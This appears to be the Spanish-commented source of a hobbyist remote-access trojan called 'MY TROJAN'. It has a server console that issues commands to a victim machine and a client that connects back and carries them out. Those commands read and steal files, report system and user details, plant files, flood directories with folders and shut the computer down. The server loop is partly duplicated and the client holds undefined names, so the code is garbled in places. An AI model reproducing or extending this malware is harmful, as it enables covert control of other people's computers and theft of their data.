#importamos las librerias
import socket #libreria para crear la conexion cliente/servidor
from colorama import Fore, Back, Style #libreria para decorar textos y banners
import colorama
import os #libreria de multiples usos
from time import sleep #libreria para crear pausas en segundos
import random #libreria para generar numeros aleatorios
 
#ajustar el tamaño terminal
if os.name == "posix": #comprobamos si el ordenador es de linux o windows
    os.system('printf "\033[8;10;42t"') #ajustamos la terminal en linux
elif os.name == "ce" or os.name == "nt" or os.name == "dos":
    os.system('mode con: cols=124 lines=40') #ajustamos la terminal en MacOs y windows
 
#funciones generales
def menuDeAyuda(): #imprime un menu de ayuda con todos los comandos disponibles
    borrarPantalla() #Usa la funcion limpiar pantalla para limpiar la terminal
    print(Fore.BLUE + "Esta es un lista de comandos disponibles") #Fore es usado para cambiar el color de las letras
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Info - Muestra informacion del sistema infectado                                     " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Dir - Muestra los archivos en el directorio actual                                   " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Close - Cierra la conexion                                                           " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Cls - Limpia la consola                                                              " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Cd - Cambia el directorio actual                                                     " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Help - Muestra este menu de ayuda                                                    " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Pwd - Muestra el directorio actual                                                   " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Shutdown - Apaga la computadora (solo windows)                                       " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Download - Lleva archivos comprimidos de tu ordenador  al \nordenador de la victima  " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Banner - Genera un banner aleatorio                                                  " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Col - Colapsa la ruta seleccionada con las carpetas indicadas                        " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Touch - Crea un archivo de texto en la ruta seleccionada                             " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Read - Sirve para leer documentos                                                    " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Compress - Comprime archivos en el ordenador de la victima                           " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Uncompress - Descomprime archivos en el ordenador de la victima                      " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Usr - Muestra el nombre de usuario de el ordenador infectado                         " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Mkdir - Crea una carpeta en la ruta espedificada                                     " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Move - Mueve archivos a la ruta seleccionada                                         " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
 
 
 
def borrarPantalla(): #Limpia la terminal
    if os.name == "posix": #Si es linux limpia la pantalla en linux
        os.system ("clear")
    elif os.name == "ce" or os.name == "nt" or os.name == "dos": #Si es windows o mac os la limpia para esos sistemas
        os.system ("cls")
 
#Los banners son dibujitos que aparecen al ejecutar el script y al usar el comando banner
def banner1():
    print(Fore.BLACK + "\n\n" +
Back.BLACK + "     " + "                                                                                           \n" +
Back.BLACK + "     " + "                                                                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                           \n" +
Back.BLACK + "     " + "  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                  \n" +
Back.BLACK + "     " + "                                                                                           \n" +
Fore.BLUE + Back.BLACK + "\n" + "                          MY TROJAN")
 
 
def banner2():
    print(Fore.BLUE + "\n \n"
                      "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      "$$" + Fore.GREEN +"oooooooooooooooooooooooooooooooooooooooooooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"oooooooooooooo" + Fore.BLUE + "$$" + Fore.GREEN + "oooooooooooooooooooooo" + Fore.BLUE + "$$" + Fore.GREEN + "oooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"ooooooooooooo" + Fore.BLUE + "$$" + Fore.GREEN + "oooooooooooooooooooooooo" + Fore.BLUE + "$$" + Fore.GREEN + "ooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"ooooooooooooo" + Fore.BLUE + "$$" + Fore.GREEN + "oooooooooooooooooooooooo" + Fore.BLUE + "$$" + Fore.GREEN + "ooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"oooooooooooooooooooooooooooooooooooooooooooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"oooooooooooooo" + Fore.BLUE + "$" + Fore.GREEN + "oooooooooooooooooooooooo" + Fore.BLUE + "$" + Fore.GREEN + "oooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"ooooooooooooooo" + Fore.BLUE + "$" + Fore.GREEN + "oooooooooooooooooooooo" + Fore.BLUE + "$" + Fore.GREEN + "ooooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"oooooooooooooooo" + Fore.BLUE + "$$$$$$$$$$$$$$$$$$$$$$" + Fore.GREEN + "oooooooooooooooooo" + Fore.BLUE + "$$\n" +
                      "$$" + Fore.GREEN +"oooooooooooooooooooooooooooooooooooooooooooooooooooooooo" + Fore.BLUE + "$$\n" +                                                
                      "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      " $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      "  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      "   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      "    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      "     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                      "                                                                   \n"
                      "                          MY TROJAN                                  ")
 
 
def banner3():
    print(Fore.YELLOW + "\n\n"
                        "                               000000000000000000000000000000000000000                                                    \n"
                        "                               000000000000000000000000000000000000000                                                    \n"
                        "                               000000000000000000000000000000000000000                                                    \n"
                        "                               0000000                          000000  0000000000000                                     \n"
                        "    ****000000000000000000000000000000                          000000000000000000  000                                   \n"
                        " *****00000000000000000000000000000000                          000000000000         |                                    \n"
                        "    ****000000000000000000000000000000                          00000000000000000000000                                   \n" + Fore.BLUE)
 
def banner4():
    print(Fore.WHITE + "        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                     \n"
                       "       $                                     $                                                    \n"
                       "      $   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                     \n"
                       "     $   $                                                                                        \n"
                       "    $   $                                                                                         \n"
                       "   $   $                                                                                          \n"
                       "  $   $                                                      $$$$                 $$$$            \n"
                       " $   $                                                       $$$$                 $$$$            \n"
                       "$   $                                                   $$$$$$$$$$$$$$       $$$$$$$$$$$$$$       \n"
                       "$   $                                                   $$$$$$$$$$$$$$       $$$$$$$$$$$$$$       \n"
                       " $   $                                                       $$$$                 $$$$            \n"
                       "  $   $                                                      $$$$                 $$$$            \n"
                       "   $   $                                                                                          \n"
                       "    $   $                                                                                         \n"
                       "     $   $                                                                                        \n"
                       "      $   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                     \n"
                       "       $                                     $                                                    \n"
                       "        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                     \n" + Fore.BLUE)
 
 
def defineBanner(): #Esta funcion define un banner aleatorio
    num = random.randint(1, 4) #Genera un numero aleatorio entre 1 y 4
 
    if(num == 1): #Dependiendo de que numero sea usa un banner diferente
        banner1()
    if(num == 2):
        banner2()
    if(num == 3):
        banner3()
    if(num == 4):
        banner4()
 
#Iniciar colorama
colorama.init() #Inicia colorama para poder colorear
 
#Poner socket en linea
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Define socket
s.bind(('127.0.0.1', 1234)) #Lo pone en modo servidor
#poner socket a la escucha
s.listen()
 
#decoracion
borrarPantalla() #Borra la pantalla para evitar problemas
defineBanner() #Llama a la funcion defineBanner para dibujar un banner aleatorio
print(Fore.BLUE + "Esperando una conexion...") #Muestra que esta esperando una conexion para aclarar dudas
 
#variables generales
guid = "" #Es la variable donde se introducira el comando a usar
cmdList = ["Help", "Close", "Cls", "Cd", "Info", "Dir", "Pwd", "Shutdown", "Download", "Banner", "Col", "Touch", "Read", "Uncompress", "Compress", "Usr", "Mkdir", "Move"] #Es una lista de todos los comandos que use para evitar errores
 
#aceptar nueva conexion
clientsocket, address = s.accept() #Si el cliente solicita unirse acepta la conexion
 
#mostrar informacion basica de la nueva conexion
marca = clientsocket.recv(1024) #Recive una informacion enviada desde el cliente y la almacena en la variable marca
marca.decode("utf-8") #Descodifica e mensaje (siempre hay que codificar para enviar y lo contrario al recivir)
print(Fore.BLUE + f"New connection from a {marca}/{address}") #Imprime el sistema operativo y la direccion ip del sistema infectado
 
while True: #Empieza a recibir ordenes para enviar
            #Me quedan hacer muchas cosas aqui entre ellas
            #Pedir una respuesta de confirmacion en cada comando
            #(Solo lo tengo en algunos)
 
    guid = input() #Pide que ingreses un comando
 
    try: #Intenta ejecutar el siguiente codigo
        if(guid != ""): #Comprueba que el comando introducido sea diferente a nada
            if(guid == "Banner"): #Si es igual a Banner usa la funcion defindeBanner para imprimir un banner
                defineBanner()
            if(guid == "Help"): #Si es igual a Help imprime el menu de ayuda
                menuDeAyuda()
            if(guid == "Close"): #Si es igual a Close cierra la conexion
                clientsocket.send(bytes(guid, "utf-8")) #Envia el comando al cliente para cerrar la conexion desde hay tambien
                print(Fore.YELLOW + "La conexion se a roto" + Fore.RED)
                sleep(1) #Espera un segundo
                print("Ya no podra ejecutar mas comandos en la victima..." + Fore.BLUE)
                os.system("pause") #Crea una pausa
                break #Cierra el bucle para que se cierre el programa
            if(guid == "Cls"): #Si el comando es igual a Cls limpia la consola con la funcion borrarPantalla
                borrarPantalla()
            if(guid == "Cd"): #Si el comando es igual a Cd
                clientsocket.send(bytes(guid, "utf-8")) #Envia el comando al cliente
                direc = input("Cual es la ruta a la que moverse...") #Pide que escriba la ruta a la que se quiere mover
                clientsocket.send(bytes(direc, "utf-8")) #La manda al cliente
            if(guid == "Info" or guid == "Dir" or guid == "Pwd" or guid == "Usr"): #Estos tres comandos son muy similares ya que solo muestran informacion de la victima
                clientsocket.send(bytes(guid, "utf-8"))
                respuesta = clientsocket.recv(10024)
                print(Fore.BLUE + "-------------------------------------------")
                print(respuesta.decode("utf-8"))
                print(Fore.BLUE + "-------------------------------------------")
            if(guid == "Shutdown"): #Si el comando es igual a Shutdown
                clientsocket.send(bytes(guid, "utf-8")) #Envia el comando a la victima para que reciva la orden
                print("La conexion se perdera al apagar el ordenador(solo funciona en windows)")
                break #Rompe el bucle para que acabe el programa
            if(guid == "Download"): #Si el comando es igual a Download(este me costo montarlo asi que si no entiendes no te procupes)
                clientsocket.send(bytes(guid, "utf-8")) #Envia la orden al cliente
                fileName = input("Nombre y extension del nuevo archivo...") #Pide el nombre y la extension del nuevo archivo
                clientsocket.send(bytes(fileName, "utf-8")) #Envia los datos anteriores
                file = input("Archivo que quiere descargar en la conexion...") #Pide la ruta de un archivo .zip o .rar en tu ordenador para pasarlo al de la victima
                f = open(file, 'rb') #Abre ese archivo con permisos de lectura para leer el binario(todos los archivos estan formados por binario)
                fileData = f.read(99999999) #Lee el binario obtenido
                clientsocket.send(fileData) #Lo envia(no hace falta codificarlo porque ya esta codificado)
                print("Archivo enviado...")
                respuestaDeComprobacion = clientsocket.recv(1024) #Recibe la respuesta del cliente
                print(respuestaDeComprobacion.decode("utf-8")) #Y la muestra por pantalla
            if(guid == "Col"):#Si el comando es igual a Col
                clientsocket.send(bytes(guid, "utf-8")) #Envia la orden al cliente
                numC = input("Cuantas carpetas quiere crear...") #Pregunta al usuario cuantas carpetas quiere crear
                clientsocket.send(bytes(numC, "utf-8")) #Lo manda al cliente
                colPath = input("Cual es la ruta que desea colapsar...") #Pregunta cual es la ruta a colapsar
                clientsocket.send(bytes(numC, "utf-8")) #La envia
                print(Fore.YELLOW + "Colapsando..." + Fore.BLUE)
                print("Esperando respuesta...")
                respuesta = clientsocket.recv(1024) #Recoge la respuesta de confirmacion
                print(respuesta.decode("utf-8")) #La imprime
            if(guid == "Touch"): #Si es igual a Touch
                clientsocket.send(bytes(guid, "utf-8")) #Envia la orden al cliente
                titulo = input("Titulo del documento...") #Pregunta por el titulo del documento(extension incluida)
                clientsocket.send(bytes(titulo, "utf-8")) #La envia al cliente
                filePath = input("Ruta donde el documento se creara...") #Pide que ingrese la ruta donde se creara el documento
                clientsocket.send(bytes(filePath, "utf-8")) #La envia al cliente
                content = input("Contenido del documento...") #Pregunta por el contenido del documento
                clientsocket.send(bytes(content, "utf-8")) #Lo envia al cliente
                print("Esperando respuesta")
                respuestaDeConfrimacion = clientsocket.recv(1024) #Recive la respuesta del cliente
                print(respuestaDeConfirmacion.decode("utf-8")) #La imprime en la consola
            if(guid == "Read"): #Si la orden es igual a Read
                clientsocket.send(bytes(guid, "utf-8")) #La envia al cliente
                fileRead = input("Ruta del archivo que desea leer(procure que el archivo no sea muy extenso)...") #Pregunta sobre la ruta del documento
                clientsocket.send(bytes(fileRead, "utf-8")) #La manda al cliente
                cont = clientsocket.recv(999999) #Recibe la respuesta del cliente(o el contenido o un error)
                print("----------------------------------------------------")
                print(cont.decode("utf-8")) #La imprime
                print("----------------------------------------------------")
            if(guid == "Uncompress"): #Si el comando es igual a Uncompress(otro complicado)
                clientsocket.send(bytes(guid, "utf-8")) #Envia la orden al cliente
                uncompressPath = input("Introduzca la ruta del archivo a descomprimir...") #Pide la ruta del archivo a descomprimir
                clientsocket.send(bytes(uncompressPath, "utf-8")) #La envia
                finalPath = input("Introduzca la ruta en la que desea decomprimir el archivo(sin el archivo)...") #Pide la ruta en la que se quiere descomprimir
                clientsocket.send(bytes(finalPath, "utf-8")) #La envia
                print("Esperando respuesta....")
                respuesta = clientsocket.recv(1024) #Recibe la respuesta de confirmacion
                print(respuesta.decode("utf-8")) #La imprime
            if(guid == "Compress"): #Si es igual a Compress
                clientsocket.send(bytes(guid, "utf-8")) #Envia la orden
                nombreDelArchivo = input("Nombre del archivo...") #Pregunta el nuevo nombre(extension .rar .zip o similares)
                clientsocket.send(bytes(nombreDelArchivo, "utf-8")) #La envia
                rutaDelArchivo = input("Ruta del archivo a comprimir...") #Pregunta la ruta del archivo a comprimir
                clientsocket.send(bytes(rutaDelArchivo, "utf-8")) #La envia
                print("Esperando respuesta...")
                respuesta = clientsocket.recv(1024) #Recive respuesta del cliente
                print(respuesta.decode("utf-8")) #La imprime
            if(guid == "Mkdir"): #Si la orden es Mkdir
                clientsocket.send(bytes(guid, "utf-8")) # Envia la orden
                path = input("Ingrese la ruta...") #Pide la ruta de la nueva carpeta
                clientsocket.send(bytes(path, "utf-8")) #La envia al cliente
                print("Esperando respuesta...")
                respuesta = clientsocket.recv(1024) #Recibe la respuesta de confirmacion
                print(respuesta.decode("utf-8")) #La imprime
            if(guid == "Move"): #Si la orden es igual a Move
                clientsocket.send(bytes(guid, "utf-8")) #La envia al cliente
                movePath = input("Ruta del archivo a mover...") #Pide la ruta del archivo a mover
                clientsocket.send(bytes(movePath, "utf-8")) #La envia
                moveDestiny = input("Ruta de destino...") #Pide la nueva ruta
                clientsocket.send(bytes(moveDestiny, "utf-8")) #La envia
                print("Esperando respuesta...")
                respuestaDeConfirmacion = clientsocket.recv(1024) #Recibe la respuesta del cliente
                print(respuestaDeConfirmacion.decode("utf-8")) #La imprime
            if(guid != cmdList[0] and guid != cmdList[1] and guid != cmdList[2] and guid != cmdList[3] and guid != cmdList[4] and guid != cmdList[5] and guid != cmdList[6] and guid != cmdList[7] and guid != cmdList[8] and guid != cmdList[9] and guid != cmdList[10] and guid != cmdList[11] and guid != cmdList[12] and guid != cmdList[13] and guid != cmdList[14] and guid != cmdList[15] and guid != cmdList[16] and guid != cmdList[17]): #Comprueba si el comando ingresado esta en la lista de comandos
                print(Fore.RED + "Debe introducir un comando valido..." + Fore.BLUE) #Si no esta imprime esto
 
 
    except:#Si en el primer try que vimos hay algun error y no consigue ejecuar el codigo
        print(Fore.RED + "Ha ocurrido un error, es probable que la conexion haya caido..." + Fore.BLUE) #Imprime esto y asi evitamos que se cierre el programa                clientsocket.send(bytes(path, "utf-8")) #La envia al cliente
                print("Esperando respuesta...")
                respuesta = clientsocket.recv(1024) #Recibe la respuesta de confirmacion
                print(respuesta.decode("utf-8")) #La imprime
            if(guid == "Move"): #Si la orden es igual a Move
                clientsocket.send(bytes(guid, "utf-8")) #La envia al cliente
                movePath = input("Ruta del archivo a mover...") #Pide la ruta del archivo a mover
                clientsocket.send(bytes(movePath, "utf-8")) #La envia
                moveDestiny = input("Ruta de destino...") #Pide la nueva ruta
                clientsocket.send(bytes(moveDestiny, "utf-8")) #La envia
                print("Esperando respuesta...")
                respuestaDeConfirmacion = clientsocket.recv(1024) #Recibe la respuesta del cliente
                print(respuestaDeConfirmacion.decode("utf-8")) #La imprime
            if(guid != cmdList[0] and guid != cmdList[1] and guid != cmdList[2] and guid != cmdList[3] and guid != cmdList[4] and guid != cmdList[5] and guid != cmdList[6] and guid != cmdList[7] and guid != cmdList[8] and guid != cmdList[9] and guid != cmdList[10] and guid != cmdList[11] and guid != cmdList[12] and guid != cmdList[13] and guid != cmdList[14] and guid != cmdList[15] and guid != cmdList[16] and guid != cmdList[17]): #Comprueba si el comando ingresado esta en la lista de comandos
                print(Fore.RED + "Debe introducir un comando valido..." + Fore.BLUE) #Si no esta imprime esto
 
 
    except:#Si en el primer try que vimos hay algun error y no consigue ejecuar el codigo
        print(Fore.RED + "Ha ocurrido un error, es probable que la conexion haya caido..." + Fore.BLUE) #Imprime esto y asi evitamos que se cierre el programa
 
Cliente
Código
import socket
import subprocess
import platform
import os
import getpass
import time
import zipfile
import patoolib
from shutil import move
 
var = False
espera = 1
while var == False:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('127.0.0.1', 1234))
        var = True
    except:
        print("furrula")
        time.sleep(60)
 
 
client.send(bytes(f"{platform.system()}", "utf-8"))
while True:
 
    sysInfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
    msg = client.recv(100)
    msg.decode("utf-8")
    print(msg)
 
    if(msg == b'Info'):
        client.send(bytes(sysInfo, "utf-8"))
 
    if(msg == b'Dir'):
        client.send(bytes(str(os.listdir(".")), "utf-8"))
 
    if(msg == b'Cd'):
        direc = client.recv(100)
        direc.decode("utf-8")
        os.chdir(direc)
 
    if(msg == b'Pwd'):
        ruta = f'{os.getcwd()}'
        print(ruta)
        client.send(bytes(ruta, "utf-8"))
 
    if(msg == b'Shutdown'):
        os.system('shutdown -s -t 1')
 
    if (msg == b'Close'):
        break
 
    if(msg == b'Col'):
        numC = client.recv(1024)
        colPath = client.recv(1024)
        for i in range(0, int(numC)):
            rutaColapsada = colPath.decode("utf-8") + "\\" + str(i)
            if os.path.exists(rutaColapsada):
                rutaColapsada = rutaColapsada + str(arregloParaRutas)
                os.mkdir(rutaColapsada)
            else:
                os.mkdir(rutaColapsada)
        client.send(bytes("Proceso terminado", "utf-8"))
 
    if(msg == b'Touch'):
        try:
            titulo = client.recv(1024)
            print(titulo)
            filePath = client.recv(1024)
            print(filePath)
            contenido = client.recv(100024)
            print(contenido)
            file = open(filePath.decode("utf-8") + "\\" + titulo.decode("utf-8"), "w")
            print("Creado")
            file.write(contenido.decode("utf-8"))
            file.close()
            cliente.send(bytes("Creado correctamente", "utf-8"))
        except:
            client.send(bytes("A ocuriido un error", "utf-8"))
    if(msg == b'Download'):
        try:
            fileName = client.recv(100)
            f = open(fileName, 'wb')
            print(fileName)
            fileData = client.recv(99999999)
            print(fileData)
            time.sleep(2)
            f.write(fileData)
            f.close()
            client.send(bytes("Creado correctamente", "utf-8"))
 
        except:
            client.send(bytes("Ha ocurrido un error, probablemente no tengas los permisos suficientes", "utf-8"))
 
    if(msg == b'Read'):
        pathFile = client.recv(1024)
        pathFile.decode("utf-8")
        f = open(pathFile, 'rb')
        fileData = f.read(99999)
        client.send(fileData)
 
    if(msg == b'Uncompress'):
        try:
            uncompressPath = client.recv(1024)
            uncompressDestiny = client.recv(1024)
            patoolib.extract_archive(uncompressPath.decode("utf-8"), outdir=uncompressDestiny.decode("utf-8"))
            client.send(bytes("Descomprimido correctamente", "utf-8"))
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
 
    if(msg == b'Usr'):
        client.send(bytes(getpass.getuser(), "utf-8"))
 
    if(msg == b'Compress'):
        try:
            name = client.recv(1024)
            namePath = client.recv(1024)
 
            jungle_zip = zipfile.ZipFile(name.decode("utf-8"), 'w')
            jungle_zip.write(namePath.decode("utf-8"), compress_type=zipfile.ZIP_DEFLATED)
 
            jungle_zip.close()
            client.send(bytes("Comprimido correctamente", "utf-8"))
 
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
    if(msg == b'Mkdir'):
        try:
            path = client.recv(1024)
            os.mkdir(path.decode("utf-8"))
            client.send(bytes("Creada correctamente", "utf-8"))
            print("enviado")
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
    if(msg == b'Move'):
        try:
            movePath = client.recv(1024)
            moveDestiny = client.recv(1024)
            move(movePath.decode("utf-8"), moveDestiny.decode("utf-8"))
            client.send(bytes("Transportado correctamente", "utf-8"))
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
    time.sleep(espera)